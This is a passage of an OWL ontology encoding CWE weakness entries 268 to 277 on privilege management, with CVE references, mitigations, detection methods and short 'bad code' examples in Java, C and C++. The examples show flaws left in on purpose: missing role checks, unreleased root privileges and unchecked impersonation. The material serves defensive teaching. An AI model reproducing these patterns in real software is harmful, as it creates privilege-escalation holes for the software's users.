        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Gain certain rights via privilege chaining in alternate channel."^^xsd:string
                 
                 references  CVE-2002-1772,
     
     Annotations: rdfs:comment "\"operator\" user can overwrite usernames and passwords to gain admin privileges."^^xsd:string
                 
                 references  CVE-2003-0640,
     
     Annotations: rdfs:comment "Chaining of user rights."^^xsd:string
                 
                 references  CVE-2005-1736,
     
     Annotations: rdfs:comment "Application is allowed to assign extra permissions to itself."^^xsd:string
                 
                 references  CVE-2005-1973,
     ID  "268"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening
Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Separation of Privilege
Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "A user can be given or gain access rights of another user. This can give the user unauthorized access to sensitive information including the access information of another user."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This code allows someone with the role of \"ADMIN\" or \"OPERATOR\" to reset a user's password. The role of \"OPERATOR\" is intended to have less privileges than an \"ADMIN\", but still be able to help users with small issues such as forgotten passwords.

Example Language: Java  /* (bad code) */
public enum Roles {
ADMIN,OPERATOR,USER,GUEST
}

public void resetPassword(User requestingUser, User user, String password ){
if(isAuthenticated(requestingUser)){
switch(requestingUser.role){
case GUEST:
System.out.println(\"You are not authorized to perform this command\");
break;

case USER:
System.out.println(\"You are not authorized to perform this command\");
break;

default:
setPassword(user,password);
break;
}
}

else{
System.out.println(\"You must be logged in to perform this command\");
}
}
This code does not check the role of the user whose password is being reset. It is possible for an Operator to gain Admin privileges by resetting the password of an Admin account and taking control of that account."^^xsd:string
                 
                 demonstrative_examples  "",
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-269_Improper_Privilege_Management

    Annotations: 
        rdfs:comment "The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Does not properly compute roles."^^xsd:string
                 
                 references  CVE-2001-0128,
     
     Annotations: rdfs:comment "Does not properly pass security context to child processes in certain cases, allows privilege escalation."^^xsd:string
                 
                 references  CVE-2001-1514,
     
     Annotations: rdfs:comment "Terminal privileges are not reset when a user logs out."^^xsd:string
                 
                 references  CVE-2001-1555,
     
     Annotations: rdfs:comment "Restful Privilege Elevation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-58,
     ID  "269"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Separation of Privilege
Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource."^^xsd:string, 
                 rdfs:comment "Strategy: Separation of Privilege
Follow the principle of least privilege when assigning access rights to entities in a software system."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 operation  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-270_Privilege_Context_Switching_Error

    Annotations: 
        rdfs:comment "Research Gap
This concept needs more study."^^xsd:string,
        rdfs:comment "The software does not properly manage privileges while it is switching between different contexts that have different privileges or spheres of control."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Web browser cross domain problem when user hits \"back\" button."^^xsd:string
                 
                 references  CVE-2002-1688,
     
     Annotations: rdfs:comment "Cross-domain issue - third party product passes code to web browser, which executes it in unsafe zone."^^xsd:string
                 
                 references  CVE-2002-1770,
     
     Annotations: rdfs:comment "Web browser cross domain problem when user hits \"back\" button."^^xsd:string
                 
                 references  CVE-2003-1026,
     
     Annotations: rdfs:comment "Run callback in different security context after it has been changed from untrusted to trusted. * note that \"context switch before actions are completed\" is one type of problem that happens frequently, espec. in browsers."^^xsd:string
                 
                 references  CVE-2005-2263,
     
     Annotations: rdfs:comment "Using Malicious Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-17,
     
     Annotations: rdfs:comment "Catching exception throw/signal from privileged block"^^xsd:string
                 
                 related_attack_patterns  CAPEC-236,
     
     Annotations: rdfs:comment "Hijacking a Privileged Thread of Execution"^^xsd:string
                 
                 related_attack_patterns  CAPEC-30,
     
     Annotations: rdfs:comment "Leverage Executable Code in Non-Executable Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-35,
     ID  "270"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening
Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Separation of Privilege
Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "A user can assume the identity of another user with separate privileges in another context. This will give the user unauthorized access that may allow them to acquire the access information of other user."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening
Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 operation  ""^^xsd:string
    
    
Individual: CWE-272_Least_Privilege_Violation

    Annotations: 
        rdfs:comment "Maintenance
CWE-271, CWE-272, and CWE-250 are all closely related and possibly overlapping. CWE-271 is probably better suited as a category."^^xsd:string,
        rdfs:comment "Other
If system privileges are not dropped when it is reasonable to do so, this is not a vulnerability by itself. According to the principle of least privilege, access should be allowed only when it is absolutely necessary to the function of a given system, and only for the minimal necessary amount of time. Any further allowance of privilege widens the window of time during which a successful exploitation of the system will provide an attacker with that same privilege. If at all possible, limit the allowance of system privilege to small, simple sections of code that may be called atomically.
When a program calls a privileged function, such as chroot(), it must first acquire root privilege. As soon as the privileged operation has completed, the program should drop root privilege and return to the privilege level of the invoking user."^^xsd:string,
        rdfs:comment "The elevated privilege level required to perform operations such as chroot() should be dropped immediately after the operation is performed."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Using Malicious Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-17,
     
     Annotations: rdfs:comment "Leverage Executable Code in Non-Executable Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-35,
     
     Annotations: rdfs:comment "Manipulating Web Input to File System Calls"^^xsd:string
                 
                 related_attack_patterns  CAPEC-76,
     ID  "272"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     access_control  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Separation of Privilege
Compartmentalize the system to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges."^^xsd:string, 
                 rdfs:comment "Strategy: Separation of Privilege
Follow the principle of least privilege when assigning access rights to entities in a software system."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may be able to access resourses with the elevated privilege that could not be accessed with the attacker's original privileges. This is particularly likely in conjunction with another flaw, such as a buffer overflow."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following example demonstrates the weakness.

Example Language: C  /* (bad code) */
setuid(0);
// Do some important stuff 
setuid(old_uid);
// Do some non privileged stuff. 
(bad code)
Example Language: Java 
method() {
AccessController.doPrivileged(new PrivilegedAction()) {
public Object run() {

// Insert all code here 
}
};
}"^^xsd:string, 
                 rdfs:comment "Example 2

The following code calls chroot() to restrict the application to a subset of the filesystem below APP_HOME in order to prevent an attacker from using the program to gain unauthorized access to files located elsewhere. The code then opens a file specified by the user and processes the contents of the file.

Example Language: C  /* (bad code) */
chroot(APP_HOME);
chdir(\"/\");
FILE* data = fopen(argv[1], \"r+\");
...
Constraining the process inside the application's home directory before opening any files is a valuable security measure. However, the absence of a call to setuid() with some non-zero value means the application is continuing to operate with unnecessary root privileges. Any successful exploit carried out by an attacker against the application can now result in a privilege escalation attack because any malicious operations will be performed with the privileges of the superuser. If the application drops to the privilege level of a non-root user, the potential for damage is substantially reduced."^^xsd:string
                 
                 demonstrative_examples  "",
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Host-based Vulnerability Scanners – Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis with Automated Results Interpretation"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Compare binary / bytecode to application permission manifest
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Permission Manifest Analysis
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Source code Weakness Analyzer
- Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Manual Source Code Review (not inspections)
Cost effective for partial coverage:
- Focused Manual Spotcheck - Focused manual analysis of source
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-273_Improper_Check_for_Dropped_Privileges

    Annotations: 
        rdfs:comment "Affected Resources:
System Process"^^xsd:string,
        rdfs:comment "Background Details
In Windows based environments that have access control, impersonation is used so that access checks can be performed on a client identity by a server with higher privileges. By impersonating the client, the server is restricted to client-level security -- although in different threads it may have much higher privileges."^^xsd:string,
        rdfs:comment "If the drop fails, the software will continue to run with the raised privileges, which might provide additional access to unprivileged users."^^xsd:string,
        rdfs:comment "The software attempts to drop privileges but does not check or incorrectly checks to see if the drop succeeded."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail."^^xsd:string
                 
                 references  CVE-2006-2916,
     
     Annotations: rdfs:comment "Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail."^^xsd:string
                 
                 references  CVE-2006-4447,
     ID  "273"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "If privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator."^^xsd:string, 
                 rdfs:comment "If privileges are not dropped, neither are access rights of the user. Often these rights can be prevented from being dropped."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "If privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator."^^xsd:string
                 
                 access_control  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Separation of Privilege
Compartmentalize the system to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "This code attempts to take on the privileges of a user before creating a file, thus avoiding performing the action with unnecessarily high privileges:

(bad code)
Example Language: C++ 
bool DoSecureStuff(HANDLE hPipe) {
bool fDataWritten = false;
ImpersonateNamedPipeClient(hPipe);
HANDLE hFile = CreateFile(...);
/../
RevertToSelf()
/../
}
The call to ImpersonateNamedPipeClient may fail, but the return value is not checked. If the call fails, the code may execute with higher privileges than intended. In this case, an attacker could exploit this behavior to write a file to a location that the attacker does not have access to."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Check the results of all functions that return a value and verify that the value is expected.
Effectiveness: High
Note: Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment."^^xsd:string, 
                 rdfs:comment "In Windows, make sure that the process token has the SeImpersonatePrivilege(Microsoft Server 2003). Code that relies on impersonation for security must ensure that the impersonation succeeded, i.e., that a proper privilege demotion happened."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "If privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator."^^xsd:string
                 
                 non-repudiation  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "If privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator."^^xsd:string
                 
                 non-repudiation  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "This issue is likely to occur in restrictive environments in which the operating system or application provides fine-grained control over privilege management."^^xsd:string
                 
                 operation  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-274_Improper_Handling_of_Insufficient_Privileges

    Annotations: 
        rdfs:comment "Maintenance:
CWE-280 and CWE-274 are too similar. It is likely that CWE-274 will be deprecated in the future."^^xsd:string,
        rdfs:comment "Relationship:
Overlaps dropped privileges, insufficient permissions."^^xsd:string,
        rdfs:comment "Relationship:
This has a layering relationship with Unchecked Error Condition and Unchecked Return Value."^^xsd:string,
        rdfs:comment "The software does not handle or incorrectly handles when it has insufficient privileges to perform an operation, leading to resultant weaknesses."^^xsd:string,
        rdfs:comment "Theoretical:
Within the context of vulnerability theory, privileges and permissions are two sides of the same coin. Privileges are associated with actors, and permissions are associated with resources. To perform access control, at some point the software makes a decision about whether the actor (and the privileges that have been assigned to that actor) is allowed to access the resource (based on the permissions that have been specified for that resource)."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "System limits are not properly enforced after privileges are dropped."^^xsd:string
                 
                 references  CVE-2001-1564,
     
     Annotations: rdfs:comment "Does not give admin sufficient privileges to overcome otherwise legitimate user actions."^^xsd:string
                 
                 references  CVE-2005-1641,
     
     Annotations: rdfs:comment "Firewall crashes when it can't read a critical memory block that was protected by a malicious process."^^xsd:string
                 
                 references  CVE-2005-3286,
     ID  "274"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     other  "Alter Execution Logic"^^xsd:string,
     other  "Other"^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-276_Incorrect_Default_Permissions

    Annotations: 
        rdfs:comment "The software, upon installation, sets incorrect permissions for an object that exposes it to an unintended actor."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Default permissions of a device allow IP spoofing."^^xsd:string
                 
                 references  CVE-1999-0426,
     
     Annotations: rdfs:comment "Insecure permissions for a shared secret key file. Overlaps cryptographic problem."^^xsd:string
                 
                 references  CVE-2001-0497,
     
     Annotations: rdfs:comment "World-writable log files allow information loss; world-readable file has cleartext passwords."^^xsd:string
                 
                 references  CVE-2001-1550,
     
     Annotations: rdfs:comment "World-readable directory."^^xsd:string
                 
                 references  CVE-2002-1711,
     
     Annotations: rdfs:comment "Home directories installed world-readable."^^xsd:string
                 
                 references  CVE-2002-1713,
     
     Annotations: rdfs:comment "Windows product uses insecure permissions when installing on Solaris (genesis: port error)."^^xsd:string
                 
                 references  CVE-2002-1844,
     
     Annotations: rdfs:comment "Executables installed world-writable."^^xsd:string
                 
                 references  CVE-2005-1941,
     
     Annotations: rdfs:comment "Accessing Functionality Not Properly Constrained by ACLs"^^xsd:string
                 
                 related_attack_patterns  CAPEC-1,
     
     Annotations: rdfs:comment "Directory Indexing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-127,
     
     Annotations: rdfs:comment "Web Logs Tampering"^^xsd:string
                 
                 related_attack_patterns  CAPEC-81,
     ID  "276"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Separation of Privilege
Compartmentalize the system to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges."^^xsd:string, 
                 rdfs:comment "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Host-based Vulnerability Scanners – Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria
- Web Application Scanner
- Web Services Scanner
- Database Scanners
- Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis with Automated Results Interpretation"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Host Application Interface Scanner
Cost effective for partial coverage:
- Fuzz Tester
- Framework-based Fuzzer
- Automated Monitored Execution
- Forced Path Execution
- Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis with Manual Results Interpretation"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     installation  ""^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Configuration Checker
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Static Analysis - Source Code"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Inter-application Flow Analysis
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Manual Source Code Review (not inspections)
Cost effective for partial coverage:
- Focused Manual Spotcheck - Focused manual analysis of source
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-277_Insecure_Inherited_Permissions

    Annotations: 
        rdfs:comment "A product defines a set of insecure permissions that are inherited by objects that are created by the program."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
